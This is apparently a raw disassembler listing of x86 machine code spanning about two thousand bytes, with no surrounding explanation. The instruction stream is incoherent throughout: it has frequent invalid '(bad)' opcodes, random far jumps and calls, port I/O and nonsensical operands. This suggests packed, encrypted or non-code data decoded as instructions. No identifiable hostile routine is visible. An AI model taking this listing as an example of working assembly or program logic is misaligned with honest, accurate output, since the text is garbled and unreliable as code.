  41048b:	and    ebp,DWORD PTR [esi+esi*1-0x5786d9fe]
  410492:	sbb    eax,0x170a16d8
  410497:	jbe    0x4104f0
  410499:	jnp    0x41048f
  41049b:	pop    eax
  41049c:	or     DWORD PTR [eax],esp
  41049e:	dec    edx
  41049f:	test   al,0xb6
  4104a1:	ds pop esp
  4104a3:	rcr    DWORD PTR [edx+0x45521f36],cl
  4104a9:	mov    ds:0x2f95bac9,eax
  4104ae:	in     al,dx
  4104af:	call   0xbb00:0x4a400a35
  4104b6:	inc    ebp
  4104b7:	enter  0x8db4,0x53
  4104bb:	add    eax,0x8270086d
  4104c0:	les    esp,FWORD PTR [ebx-0x45]
  4104c3:	add    BYTE PTR [esi+0x7b14c85b],dh
  4104c9:	adc    ebx,DWORD PTR [edx]
  4104cb:	ret    0x8449
  4104ce:	inc    edi
  4104cf:	lods   eax,DWORD PTR ds:[esi]
  4104d0:	push   ecx
  4104d1:	dec    ebp
  4104d2:	push   eax
  4104d3:	clc    
  4104d4:	lahf   
  4104d5:	imul   ecx,DWORD PTR [ebx],0x8dda3751
  4104db:	inc    edi
  4104dc:	cmp    al,0xad
  4104de:	mov    dl,BYTE PTR [eax+0x27]
  4104e1:	gs stos BYTE PTR es:[edi],al
  4104e3:	popa   
  4104e4:	jnp    0x41053e
  4104e6:	fisub  DWORD PTR [ecx]
  4104e8:	cs fwait
  4104ea:	push   cs
  4104eb:	pop    eax
  4104ec:	add    al,0xf6
  4104ee:	cmp    BYTE PTR [edx],bh
  4104f0:	pop    es
  4104f1:	mov    eax,0x417cbad5
  4104f6:	mov    cl,0x0
  4104f8:	pop    eax
  4104f9:	shl    DWORD PTR [edx+0x40],0xaf
  4104fd:	cmp    al,0x94
  4104ff:	sub    DWORD PTR [eax-0x57],0xec1dd5a1
  410506:	sub    al,0x6c
  410508:	popa   
  410509:	jmp    0x681e:0x66265bab
  410510:	cmc    
  410511:	arpl   WORD PTR [ebp-0x69aa5753],si
  410517:	and    eax,0xd11bd4a8
  41051c:	mov    dh,0x6d
  41051e:	cs mov bh,0x14
  410521:	shl    BYTE PTR [edi+0x166e6c8c],cl
  410527:	jbe    0x41056d
  410529:	ins    DWORD PTR es:[edi],dx
  41052a:	cwde   
  41052b:	push   ecx
  41052c:	cmp    BYTE PTR [edi-0x5dc571e8],dl
  410532:	cmp    DWORD PTR [edx-0x4d3c72c],0x4
  410539:	pop    ss
  41053a:	pop    edi
  41053b:	add    al,0x70
  41053d:	pop    ebx
  41053e:	fsubr  DWORD PTR ds:0x98316a33
  410544:	shl    bl,0xe5
  410547:	(bad)  
  410548:	push   esi
  410549:	fcomp  st(2)
  41054b:	adc    eax,eax
  41054d:	aaa    
  41054e:	ds cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  410551:	mov    ah,0x89
  410553:	call   0x14c742e
  410558:	or     al,0xe9
  41055a:	push   ebx
  41055b:	fnstsw WORD PTR [eax]
  41055d:	jge    0x4104fc
  41055f:	ss aaa 
  410561:	mov    dh,0xad
  410563:	mov    ds:0x773b7d34,eax
  410568:	add    bh,BYTE PTR [esp+edi*8+0x6372ecf1]
  41056f:	imul   ebp,DWORD PTR [ebp+0x65],0xffffffe0
  410573:	jl     0x4105e0
  410575:	test   BYTE PTR [ecx],0x5c
  410578:	or     ebp,DWORD PTR [edi+ebx*1+0x5b]
  41057c:	(bad)  ds:0x13da353
  410582:	fidivr WORD PTR [eax]
  410584:	sahf   
  410585:	es fcmovbe st,st(6)
  410588:	push   edx
  410589:	ins    BYTE PTR es:[edi],dx
  41058a:	iret   
  41058b:	scas   eax,DWORD PTR es:[edi]
  41058c:	pop    es
  41058d:	pusha  
  41058e:	fs sub cl,ch
  410591:	or     eax,0x76161616
  410596:	push   edx
  410597:	fdivr  st(0),st
  410599:	inc    ebx
  41059a:	aam    0x77
  41059c:	pop    ss
  41059d:	mov    dh,0xad
  41059f:	test   edi,edi
  4105a1:	push   ebp
  4105a2:	dec    ecx
  4105a3:	xchg   esp,eax
  4105a4:	jmp    0x6f089853
  4105a9:	push   edx
  4105aa:	rol    BYTE PTR [ecx],1
  4105ac:	jne    0x410619
  4105ae:	jge    0x4105d6
  4105b0:	mov    cl,0xa1
  4105b2:	stc    
  4105b3:	pop    ecx
  4105b4:	push   ss
  4105b5:	fisub  DWORD PTR [ebp-0x3bc703ea]
  4105bb:	cmp    ebx,ecx
  4105bd:	adc    esp,DWORD PTR [edx-0x4a]
  4105c0:	ret    0xddb6
  4105c3:	xor    BYTE PTR [ecx-0x44],0xb0
  4105c7:	iret   
  4105c8:	sub    al,0xbe
  4105ca:	mov    fs,WORD PTR [ecx+0x504d17da]
  4105d0:	mov    bh,0xeb
  4105d2:	push   es
  4105d3:	xchg   esp,eax
  4105d4:	fwait
  4105d5:	(bad)  
  4105d6:	mul    BYTE PTR [ecx+0x6b]
  4105d9:	fistp  DWORD PTR [edx-0x27]
  4105dc:	xlat   BYTE PTR ds:[ebx]
  4105dd:	gs add BYTE PTR es:0x5bbe9fb2,0x5b
  4105e6:	push   ebx
  4105e7:	jo     0x41062b
  4105e9:	jg     0x4105db
  4105eb:	xor    esi,esp
  4105ed:	ins    DWORD PTR es:[edi],dx
  4105ee:	xchg   ecx,eax
  4105ef:	into   
  4105f0:	mov    dh,0x80
  4105f2:	es or  dh,0xb7
  4105f6:	pop    edx
  4105f7:	js     0x410666
  4105f9:	mov    ebx,0xb9d1b0b1
  4105fe:	adc    ah,BYTE PTR [ebp-0x46f39475]
  410604:	repnz xor eax,0x622e454a
  41060a:	mov    al,0x64
  41060c:	sbb    BYTE PTR [ecx-0x562fd723],dh
  410612:	pop    edx
  410613:	aad    0xad
  410615:	adc    bh,BYTE PTR [ebp+0x64]
  410618:	shr    BYTE PTR [esi+0x5],1
  41061b:	stos   BYTE PTR es:[edi],al
  41061c:	sub    eax,0x62cfc227
  410621:	inc    ecx
  410622:	mov    dh,0xed
  410624:	shl    BYTE PTR [esi-0x5e8e0aa8],cl
  41062a:	sbb    dl,BYTE PTR [ecx+0x6b92b0e8]
  410630:	xor    dl,cl
  410632:	scas   al,BYTE PTR es:[edi]
  410633:	mov    eax,0xbb223ed0
  410638:	push   edi
  410639:	fnsetpm(287 only) 
  41063b:	and    bl,bl
  41063d:	outs   dx,BYTE PTR ds:[esi]
  41063e:	sbb    ecx,DWORD PTR [ebp+0x56]
  410641:	xchg   BYTE PTR ds:0xadb1473,ch
  410647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410648:	push   DWORD PTR [edx]
  41064a:	sub    ebp,edx
  41064c:	inc    esi
  41064d:	arpl   WORD PTR [edx-0x7f],bx
  410650:	in     al,0xa6
  410652:	mov    cl,0xed
  410654:	sub    al,0xdb
  410656:	ins    DWORD PTR es:[edi],dx
  410657:	mov    eax,ds:0xf23a4cb8
  41065c:	pop    ecx
  41065d:	xchg   edx,eax
  41065e:	(bad)  
  41065f:	adc    DWORD PTR [esi+0x6d28db6d],esp
  410665:	sbb    edi,DWORD PTR [eax-0x77]
  410668:	pop    edx
  410669:	mov    ?,WORD PTR [edx-0x1f]
  41066c:	dec    edx
  41066d:	cs mov ah,0xad
  410670:	mov    BYTE PTR [esi],bl
  410672:	cmp    BYTE PTR [edi-0x70b5627d],bh
  410678:	push   edi
  410679:	les    esi,FWORD PTR [esi+0x2afabb83]
  41067f:	add    ah,BYTE PTR [esi-0x8]
  410682:	fcmovnu st,st(0)
  410684:	sbb    al,BYTE PTR [ecx+0x58]
  410687:	jg     0x410651
  410689:	cmp    ebx,eax
  41068b:	test   eax,0x25a82620
  410690:	bound  esi,QWORD PTR [edi]
  410692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410693:	xchg   edx,eax
  410694:	imul   esi,DWORD PTR [esi-0x792aa3d6],0x69
  41069b:	jp     0x410657
  41069d:	dec    ebx
  41069e:	sub    dh,BYTE PTR [esi]
  4106a0:	inc    ecx
  4106a1:	fst    QWORD PTR [edi]
  4106a3:	or     BYTE PTR [edi-0x38],cl
  4106a6:	or     BYTE PTR [ecx+0x3a37041d],0xbf
  4106ad:	mov    edx,0x49e7abc0
  4106b2:	loopne 0x410639
  4106b4:	mov    dh,0x6d
  4106b6:	mov    al,ds:0xe276d195
  4106bb:	loopne 0x41066a
  4106bd:	mov    esp,0xc0768a16
  4106c2:	(bad)  
  4106c3:	clc    
  4106c4:	dec    esi
  4106c5:	out    dx,eax
  4106c6:	push   eax
  4106c7:	cmp    DWORD PTR [ecx+0x6b],edx
  4106ca:	fsubr  DWORD PTR [eax+0x1b]
  4106cd:	fwait
  4106ce:	dec    esi
  4106cf:	sub    eax,DWORD PTR es:[ecx+0x7da5327f]
  4106d6:	mov    ah,0xe5
  4106d8:	push   esi
  4106d9:	mov    ds:0x29b12062,al
  4106de:	push   esp
  4106df:	cmc    
  4106e0:	fld    TBYTE PTR [edx+0x41]
  4106e3:	sub    eax,0x4f31254c
  4106e8:	pop    esi
  4106e9:	xchg   edx,eax
  4106ea:	lea    ecx,[ebp-0x2831923a]
  4106f0:	push   0x4d
  4106f2:	test   al,0x1e
  4106f4:	jmp    0x41075c
  4106f6:	mov    dh,0xed
  4106f8:	test   ch,0x39
  4106fb:	push   0x5a
  4106fd:	mov    ds,WORD PTR [eax-0x45e8040b]
  410703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410704:	jno    0x410740
  410706:	loopne 0x41074e
  410708:	(bad)  ds:0x276ff8d4
  41070e:	jmp    0x62a0a740
  410713:	fist   DWORD PTR [esi]
  410715:	xor    DWORD PTR [ecx],eax
  410717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410718:	push   edx
  410719:	fisubr DWORD PTR [eax]
  41071b:	call   0xca413e84
  410720:	push   ebx
  410721:	ins    BYTE PTR es:[edi],dx
  410722:	test   al,0x2e
  410724:	enterw 0x86bc,0x3e
  410729:	retf   0xb685
  41072c:	aam    0x42
  41072e:	xor    BYTE PTR [esi-0xe],dh
  410731:	mov    bh,BYTE PTR ds:0xb6d3086
  410737:	sbb    eax,0xdca64c11
  41073c:	inc    edi
  41073d:	xlat   BYTE PTR ds:[ebx]
  41073e:	dec    edx
  41073f:	mov    al,0x6d
  410741:	(bad)  [esi+0x59144c05]
  410747:	mov    eax,ds:0x2c427de1
  41074c:	mov    ecx,0xb6e0286c
  410751:	mov    esi,0x604c805d
  410756:	iret   
  410757:	in     eax,0xc3
  410759:	sub    edx,DWORD PTR [eax]
  41075b:	pop    ebp
  41075c:	add    BYTE PTR [ecx],cl
  41075e:	popf   
  41075f:	mov    dl,0x50
  410761:	or     BYTE PTR [edi],al
  410763:	shr    DWORD PTR [ebp+0x43],1
  410766:	into   
  410767:	sbb    bl,BYTE PTR [ebp+eax*8-0x77]
  41076b:	fdiv   DWORD PTR [esi+0x5c6cd40d]
  410771:	lea    ecx,[ebx]
  410773:	and    al,0x23
  410775:	fdiv   DWORD PTR [esi+0x3eb26d1b]
  41077b:	mov    ds:0x79d4fd7c,al
  410780:	(bad)  [eax]
  410782:	(bad)  
  410783:	inc    ecx
  410784:	in     al,dx
  410785:	mov    dl,BYTE PTR [edx-0x1d4e7359]
  41078b:	sub    al,0x6c
  41078d:	ins    DWORD PTR es:[edi],dx
  41078e:	in     eax,dx
  41078f:	(bad)  
  410790:	fstp   QWORD PTR [eax]
  410792:	jmp    0xe4e5a5d8
  410797:	ins    DWORD PTR es:[edi],dx
  410798:	dec    ebx
  410799:	pop    ebx
  41079a:	mov    ebx,0x38312db0
  41079f:	dec    ebp
  4107a0:	sub    al,0x88
  4107a2:	std    
  4107a3:	or     al,0x65
  4107a5:	mov    edi,0x8023b0ba
  4107aa:	pop    ebx
  4107ab:	sub    ecx,DWORD PTR [eax+0x35]
  4107ae:	int    0xd4
  4107b0:	pop    edx
  4107b1:	push   edx
  4107b2:	inc    ebp
  4107b3:	fist   DWORD PTR [ebx+edx*8]
  4107b6:	jmp    0xa236:0xb613efc5
  4107bd:	mov    dh,0x26
  4107bf:	inc    edi
  4107c0:	pop    ecx
  4107c1:	adc    BYTE PTR [edi+0x4016d0e1],ch
  4107c7:	fistp  DWORD PTR [edi-0x79]
  4107ca:	out    dx,eax
  4107cb:	rol    DWORD PTR [edx+0x575b89ed],cl
  4107d1:	and    eax,0xf861173b
  4107d6:	sar    BYTE PTR [ecx],1
  4107d8:	fwait
  4107d9:	push   0x9
  4107db:	fdiv   DWORD PTR [esi+0x1dee0554]
  4107e1:	adc    dh,ah
  4107e3:	repnz mov bh,0x2
  4107e6:	mov    bh,0x8e
  4107e8:	popa   
  4107e9:	lods   eax,DWORD PTR ds:[esi]
  4107ea:	push   ebx
  4107eb:	xor    edx,eax
  4107ed:	int3   
  4107ee:	bound  edi,QWORD PTR [eax+0x342dbb80]
  4107f4:	push   ebp
  4107f5:	dec    ebx
  4107f6:	test   al,0xaf
  4107f8:	mov    ss,esp
  4107fa:	(bad)  
  4107fb:	(bad)  
  4107fc:	adc    DWORD PTR [ecx-0x25],0xffffffc6
  410800:	inc    esi
  410801:	inc    ecx
  410803:	ss push ebx
  410805:	adc    al,0xda
  410807:	popa   
  410808:	sub    DWORD PTR [esi],ebx
  41080a:	sub    eax,0xdcb86f85
  41080f:	into   
  410810:	mov    al,ds:0x6082db5b
  410815:	not    BYTE PTR [edx+0x79f2293b]
  41081b:	adc    eax,0x948785aa
  410820:	jg     0x4107dd
  410822:	test   eax,0x5b614193
  410827:	mov    al,ds:0x758d1700
  41082c:	xchg   ebp,eax
  41082d:	cwde   
  41082e:	test   DWORD PTR [edi+0x21616dc2],esi
  410834:	pop    esi
  410835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410836:	das    
  410837:	dec    esp
  410838:	fbstp  TBYTE PTR [edi+edx*1]
  41083b:	inc    ebp
  41083c:	cld    
  41083d:	pop    ebp
  41083e:	inc    ecx
  41083f:	mov    bh,0x5a
  410841:	jo     0x4108a4
  410843:	pushf  
  410844:	arpl   WORD PTR [eax+0x34],si
  410847:	pop    ss
  410848:	les    eax,FWORD PTR [esi]
  41084a:	or     BYTE PTR [esi],0x98
  41084d:	retf   
  41084e:	jp     0x4108bf
  410850:	fcmovnb st,st(6)
  410852:	mov    BYTE PTR [edx+0x32],0x19
  410856:	call   0xac342bb2
  41085b:	mov    eax,ds:0xeb76b70b
  410860:	or     al,0x1f
  410863:	cmp    DWORD PTR [edx+0x44a789b9],edx
  410869:	and    BYTE PTR [edx-0x2c],bl
  41086c:	cs jne 0x4108bf
  41086f:	mov    esp,0xe27077fc
  410874:	mov    al,0x3
  410876:	mov    cl,0x6d
  410878:	or     ebx,DWORD PTR [edi+0x6c]
  41087b:	pop    ss
  41087c:	call   0x7add:0xad6d2a86
  410883:	pusha  
  410884:	push   ss
  410885:	pushf  
  410886:	lea    ecx,[ecx+ebp*4+0x77]
  41088a:	dec    esi
  41088b:	sub    DWORD PTR [ebx+edx*2-0x1c3d7240],edi
  410892:	inc    esp
  410893:	sub    al,BYTE PTR cs:[eax-0xe]
  410897:	les    ebp,FWORD PTR [esi+0x6d]
  41089a:	ins    BYTE PTR es:[edi],dx
  41089b:	pop    ebx
  41089c:	(bad)  
  41089d:	and    BYTE PTR [ecx+0x26],al
  4108a0:	mov    gs:0x2e5e2eb3,al
  4108a6:	jne    0x4108b8
  4108a8:	ins    BYTE PTR es:[edi],dx
  4108a9:	mov    bl,BYTE PTR [edi-0x42]
  4108ac:	adc    al,0xa6
  4108ae:	leave  
  4108af:	ins    DWORD PTR es:[edi],dx
  4108b0:	pop    ebx
  4108b1:	fld    TBYTE PTR [esi]
  4108b3:	sub    al,0x22
  4108b5:	cmp    DWORD PTR [ebx],ecx
  4108b7:	sub    eax,0xc2cb35bc
  4108bc:	div    DWORD PTR [edi-0x4049068a]
  4108c2:	clc    
  4108c3:	fwait
  4108c4:	cmp    esi,0x0
  4108c7:	les    esi,FWORD PTR [edi-0x4434f4b3]
  4108cd:	cs mov ch,0x4b
  4108d0:	je     0x4108e2
  4108d2:	cdq    
  4108d3:	push   0xf59bf928
  4108d8:	pusha  
  4108d9:	imul   edx,DWORD PTR [eax],0xffffffb0
  4108dc:	retf   
  4108dd:	adc    ecx,DWORD PTR [esp+eax*2]
  4108e0:	cmp    ebp,DWORD PTR [edx+0x58d85d]
  4108e6:	sar    DWORD PTR [ecx],cl
  4108e8:	jmp    0x2651a603
  4108ed:	mov    dh,0xb5
  4108ef:	sbb    ecx,DWORD PTR ds:0xb6e9cb3
  4108f5:	imul   ecx,DWORD PTR [edi+ebp*4+0x5a176c35],0xffffffc5
  4108fd:	into   
  4108fe:	inc    ebp
  4108ff:	xchg   edi,eax
  410900:	(bad)  
  410901:	push   ecx
  410902:	or     BYTE PTR [ebp-0x46],cl
  410905:	stos   BYTE PTR es:[edi],al
  410906:	jbe    0x410918
  410908:	mov    al,ds:0x2331c72d
  41090d:	sub    esp,DWORD PTR [edx-0x25]
  410910:	push   ss
  410911:	fist   WORD PTR [esi-0xb]
  410914:	ds sub al,0x8
  410917:	cmp    bl,bl
  410919:	lods   eax,DWORD PTR ds:[esi]
  41091a:	and    ebp,DWORD PTR [eax-0x37]
  41091d:	push   ds
  41091e:	inc    ebx
  41091f:	sbb    eax,0x920579dd
  410924:	inc    esi
  410925:	popa   
  410926:	inc    ebx
  410927:	add    DWORD PTR [edx-0x23],ebx
  41092a:	sar    DWORD PTR [ebx-0x2e2f5ecd],1
  410930:	ret    0x61b0
  410933:	sbb    BYTE PTR [ebx-0x7a],bl
  410936:	jmp    0x41099c
  410938:	aad    0xb6
  41093a:	add    eax,0x5df62a60
  41093f:	xchg   ebp,eax
  410940:	mov    edx,0x5c034017
  410945:	xor    BYTE PTR [edx-0x773857e4],bh
  41094b:	xchg   bl,bl
  41094d:	lods   eax,DWORD PTR ds:[esi]
  41094e:	(bad)  
  41094f:	int    0x57
  410951:	mov    esp,0x4f48eacf
  410956:	push   edi
  410957:	mov    ss,ecx
  410959:	mov    bl,0xb6
  41095b:	shl    BYTE PTR [esi+0x50],1
  41095e:	repnz sbb DWORD PTR [ecx+0x6b],eax
  410962:	jg     0x41098f
  410964:	inc    ecx
  410965:	ss inc eax
  410967:	ins    BYTE PTR es:[edi],dx
  410968:	aad    0xea
  41096a:	jae    0x41097e
  41096c:	dec    ebx
  41096d:	ja     0x410919
  41096f:	lods   eax,DWORD PTR ds:[esi]
  410970:	sub    BYTE PTR [edx+eax*1-0x63],ch
  410974:	push   0xffffff96
  410976:	dec    edi
  410977:	leave  
  410978:	add    bl,BYTE PTR [edx]
  41097a:	cmp    eax,DWORD PTR [eax-0x7edfa968]
  410980:	ins    WORD PTR es:[edi],dx
  410982:	fcmovnb st,st(2)
  410984:	(bad)  
  410985:	jmp    DWORD PTR [edi-0x10f38394]
  41098b:	hlt    
  41098c:	jecxz  0x4109a1
  41098e:	and    BYTE PTR [ebp+0x51ecb170],0x3
  410995:	hlt    
  410996:	sbb    esi,edx
  410998:	jle    0x41094b
  41099a:	or     DWORD PTR [ebx-0x75157311],0xb0c5b322
  4109a4:	sub    eax,0xe2d1ed6d
  4109a9:	gs inc edi
  4109ab:	int    0x26
  4109ad:	ins    DWORD PTR es:[edi],dx
  4109ae:	add    bl,BYTE PTR [ebx]
  4109b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109b1:	fild   DWORD PTR [edx-0x45]
  4109b4:	mov    ds:0xb559f489,eax
  4109b9:	inc    ebp
  4109ba:	adc    al,0x87
  4109bc:	scas   al,BYTE PTR es:[edi]
  4109bd:	(bad)  [ebp+0x2c]
  4109c0:	xchg   esp,eax
  4109c1:	outs   dx,BYTE PTR ds:[esi]
  4109c2:	(bad)  
  4109c3:	xchg   esi,eax
  4109c4:	shl    BYTE PTR [ecx+0x70],cl
  4109c7:	pop    ebp
  4109c8:	xor    edi,DWORD PTR [esi+0x2c]
  4109cb:	fsubr  QWORD PTR [eax]
  4109cd:	push   ebp
  4109ce:	jle    0x410a06
  4109d0:	dec    esi
  4109d1:	out    dx,eax
  4109d2:	aaa    
  4109d3:	cs in  eax,dx
  4109d5:	push   edx
  4109d6:	add    edx,DWORD PTR [eax+0x1e]
  4109d9:	out    0xd7,al
  4109db:	fld    DWORD PTR [ebx]
  4109dd:	pop    ss
  4109de:	lods   eax,DWORD PTR ds:[esi]
  4109df:	cld    
  4109e0:	add    bl,BYTE PTR [ebx+0x38]
  4109e3:	pop    ebx
  4109e4:	mov    edx,0xfa00c709
  4109e9:	lahf   
  4109ea:	outs   dx,BYTE PTR ds:[esi]
  4109eb:	lea    ebp,[ebp-0x5411727b]
  4109f1:	xor    eax,0x8870807c
  4109f6:	jnp    0x410a0d
  4109f8:	test   al,0xda
  4109fa:	rcr    BYTE PTR [eax-0x7c],cl
  4109fd:	out    0x99,al
  4109ff:	mov    edi,gs
  410a01:	sub    eax,0x11b6db6d
  410a06:	adc    eax,0x59a4b8ad
  410a0b:	adc    DWORD PTR [edx+0x77],esp
  410a0e:	enter  0x8056,0x2a
  410a12:	mov    edi,0x545c74
  410a17:	cs xchg ebp,eax
  410a19:	mov    fs,WORD PTR [ebp+ebp*2+0x59c2e83b]
  410a20:	fs inc edi
  410a22:	into   
  410a23:	sub    esp,DWORD PTR [ecx+0x168b2680]
  410a29:	mov    dh,0xb6
  410a2b:	sub    eax,0xea2918fe
  410a30:	add    ch,ah
  410a32:	mov    al,ds:0x383a1fca
  410a37:	jne    0x410a14
  410a39:	xor    dl,bh
  410a3b:	and    edx,DWORD PTR [eax]
  410a3d:	pop    ds
  410a3e:	jne    0x4109c0
  410a40:	xor    eax,0xdd7c54a1
  410a45:	dec    ebp
  410a46:	div    DWORD PTR [eax-0x63]
  410a49:	mov    BYTE PTR [edi],bl
  410a4b:	add    DWORD PTR [eax-0x3d8fbf8b],edi
  410a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a52:	mov    edx,eax
  410a54:	lods   eax,DWORD PTR ds:[esi]
  410a55:	lods   eax,DWORD PTR ds:[esi]
  410a56:	in     al,0x6f
  410a58:	pop    esp
  410a59:	push   0x20
  410a5b:	mov    edx,ds
  410a5d:	pop    ss
  410a5e:	jl     0x410a9f
  410a60:	sbb    BYTE PTR [eax-0x41a5dc00],ch
  410a66:	sub    eax,0x27432294
  410a6b:	sahf   
  410a6c:	and    BYTE PTR [edi-0x2f2f7e00],bh
  410a72:	ret    0xa856
  410a75:	xor    al,0xe9
  410a77:	jecxz  0x410a98
  410a79:	and    DWORD PTR [ecx+0x63],esp
  410a7c:	mov    eax,ds:0x2fcce9d4
  410a81:	pop    es
  410a82:	inc    BYTE PTR [esi]
  410a84:	lds    esp,FWORD PTR [esi+0x76db6b77]
  410a8a:	and    eax,0x899efbd3
  410a8f:	xchg   esi,eax
  410a90:	pop    ecx
  410a91:	adc    DWORD PTR [edx-0xe],eax
  410a94:	fld    QWORD PTR [esi+0x35ed6eda]
  410a9a:	jb     0x410b04
  410a9c:	loopne 0x410a42
  410a9e:	call   FWORD PTR [eax+0x6e167f8b]
  410aa4:	pop    ebp
  410aa5:	shr    ecx,0x10
  410aa8:	fwait
  410aa9:	jb     0x410aad
  410aab:	dec    ebx
  410aac:	xchg   ecx,eax
  410aad:	aaa    
  410aae:	mov    esp,0x88ec0435
  410ab3:	and    DWORD PTR [ebp+0x2893781c],esi
  410ab9:	in     al,dx
  410aba:	sub    ch,BYTE PTR [esi+0x64]
  410abd:	sub    BYTE PTR [ecx+0x42],dl
  410ac0:	push   esp
  410ac1:	xor    DWORD PTR [edx+0xb],edx
  410ac4:	sbb    ebx,DWORD PTR [ebx-0x77]
  410ac7:	inc    ecx
  410ac8:	ds mov ch,0xb4
  410acb:	mov    edx,0xdb444804
  410ad0:	outs   dx,BYTE PTR ds:[esi]
  410ad1:	pop    ebx
  410ad2:	jo     0x410ad3
  410ad4:	mov    ecx,0x5b5f93cc
  410ad9:	dec    edx
  410ada:	fstp   TBYTE PTR [edx-0x7e]
  410add:	add    ch,BYTE PTR ds:0xc6f4eae6
  410ae3:	retf   
  410ae4:	inc    edx
  410ae5:	inc    edi
  410ae6:	aam    0x6d
  410ae8:	mov    ds:0xf51531d4,al
  410aed:	jl     0x410b50
  410aef:	mov    ebx,0x74d2dbb5
  410af4:	repnz dec edx
  410af6:	jge    0x410a9d
  410af8:	pop    edx
  410af9:	pop    ecx
  410afa:	mov    al,0x1f
  410afc:	out    dx,al
  410afd:	sahf   
  410afe:	mov    dh,0x6d
  410b00:	mov    ah,0x6d
  410b02:	cli    
  410b03:	fwait
  410b04:	lea    edi,[esi]
  410b06:	push   ds
  410b07:	cli    
  410b08:	das    
  410b09:	enter  0xe08c,0x82
  410b0d:	mov    dh,0xed
  410b0f:	scas   eax,DWORD PTR es:[edi]
  410b10:	out    0x14,al
  410b12:	xchg   edi,eax
  410b13:	inc    ecx
  410b14:	in     eax,dx
  410b15:	add    al,BYTE PTR [esi+0x63]
  410b18:	jmp    0xac425d63
  410b1d:	mov    DWORD PTR [ecx+eiz*1-0x31],esp
  410b21:	sub    DWORD PTR [edx-0x5f],0xfcedfc
  410b28:	push   0x7a4d4039
  410b2d:	mov    al,0xb5
  410b2f:	ins    DWORD PTR es:[edi],dx
  410b30:	ins    DWORD PTR es:[edi],dx
  410b31:	push   0x74ff2c83
  410b36:	in     al,dx
  410b37:	adc    BYTE PTR [eax],dl
  410b39:	sub    edi,DWORD PTR [edi]
  410b3b:	pop    eax
  410b3c:	mov    edx,0x4acba834
  410b41:	mov    ds:0x5f15986b,eax
  410b46:	xchg   esi,eax
  410b47:	push   ss
  410b48:	mov    dh,0x76
  410b4a:	adc    al,0x60
  410b4c:	fwait
  410b4d:	or     ebp,DWORD PTR [edx-0x4e9ab872]
  410b53:	ins    DWORD PTR es:[edi],dx
  410b54:	or     DWORD PTR [eax-0x5633f723],esp
  410b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b5c:	shl    ebx,0x5a
  410b5f:	aam    0x6e
  410b61:	mov    ch,0x54
  410b63:	jmp    0x6e731a14
  410b68:	aam    0xed
  410b6a:	inc    edi
  410b6b:	aaa    
  410b6c:	push   ss
  410b6d:	std    
  410b6e:	or     eax,0x6d1fbb93
  410b73:	cmp    al,0x28
  410b75:	dec    ebp
  410b76:	lea    eax,[ebp+0x34768a06]
  410b7c:	pop    es
  410b7d:	mov    dl,0x8b
  410b7f:	sub    ch,BYTE PTR [ebx+0x32b7000d]
  410b85:	enter  0xdebc,0x97
  410b89:	nop
  410b8a:	aam    0x2c
  410b8c:	shl    DWORD PTR [esi-0x75],1
  410b8f:	test   BYTE PTR [esi-0x18787fd3],0xad
  410b96:	imul   ebp,DWORD PTR [ecx-0x28],0x3a
  410b9a:	sub    dh,BYTE PTR [esi]
  410b9c:	imul   esi,DWORD PTR [edx+eax*8-0x4a52b447],0x85b44b8d
  410ba7:	aad    0x5d
  410ba9:	(bad)  
  410baa:	(bad)  
  410bab:	lods   al,BYTE PTR ds:[esi]
  410bac:	pop    ecx
  410bad:	in     al,0x7f
  410baf:	mov    eax,ds:0x2cc1802b
  410bb4:	cmp    al,0x82
  410bb6:	xor    bl,BYTE PTR [edx]
  410bb8:	add    BYTE PTR [eax+0x2b],bl
  410bbb:	add    BYTE PTR ds:0x22ca9711,bl
  410bc1:	and    dl,BYTE PTR [edi]
  410bc3:	sbb    ch,BYTE PTR [esi-0x5d]
  410bc6:	ss and eax,ebp
  410bc9:	mov    dh,0x6d
  410bcb:	mov    eax,ds:0xd4401d9f
  410bd0:	pop    ss
  410bd1:	sbb    ecx,DWORD PTR [ebp+ebp*1-0x4b]
  410bd5:	test   al,0xad
  410bd7:	(bad)  
  410bd8:	ds hlt 
  410bda:	leave  
  410bdb:	mov    dh,0x88
  410bdd:	retf   0xa2d6
  410be0:	mov    eax,0xf1dbaad4
  410be5:	xchg   edx,eax
  410be6:	lods   al,BYTE PTR ds:[esi]
  410be7:	ins    DWORD PTR es:[edi],dx
  410be8:	mov    al,0x39
  410bea:	fisttp DWORD PTR ss:[ebx]
  410bed:	jnp    0x410bfa
  410bef:	js     0x410bdd
  410bf1:	adc    DWORD PTR [eax+0x32b6ed04],esi
  410bf7:	adc    BYTE PTR [eax-0x6df76639],dh
  410bfd:	xlat   BYTE PTR ds:[ebx]
  410bfe:	dec    ebx
  410bff:	test   DWORD PTR ds:0xaf5b01b0,ecx
  410c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c06:	mov    bh,0x7f
  410c08:	(bad)  
  410c0a:	imul   ebx,ebx,0x2e
  410c0d:	ins    BYTE PTR es:[edi],dx
  410c0e:	and    BYTE PTR [eax+eax*2-0x33220390],0xe6
  410c16:	dec    edx
  410c17:	sbb    al,0xbb
  410c19:	(bad)  
  410c1a:	mov    BYTE PTR [esi-0x3d],0x6
  410c1e:	push   DWORD PTR [edx+0x5d5e082]
  410c24:	shr    BYTE PTR [ebp+0x79],cl
  410c27:	arpl   WORD PTR ds:0x46004415,ax
  410c2d:	jmp    0x6c6c:0x4ae8bf14
  410c34:	pop    ebp
  410c35:	shl    esp,1
  410c37:	rcl    DWORD PTR [eax+ecx*8+0x2cdbea24],0x5c
  410c3f:	push   0x41d6c540
  410c44:	xchg   esi,eax
  410c45:	icebp  
  410c46:	inc    ebp
  410c47:	pop    ebx
  410c48:	mov    eax,ds:0x7513b1a2
  410c4d:	sub    eax,0x2d28a47
  410c52:	test   DWORD PTR [ebx],ecx
  410c54:	xchg   ecx,eax
  410c55:	(bad)  
  410c56:	std    
  410c57:	mov    eax,0x5de6ae0c
  410c5c:	fsubr  DWORD PTR [eax-0x3c]
  410c5f:	iret   
  410c60:	sub    al,0x51
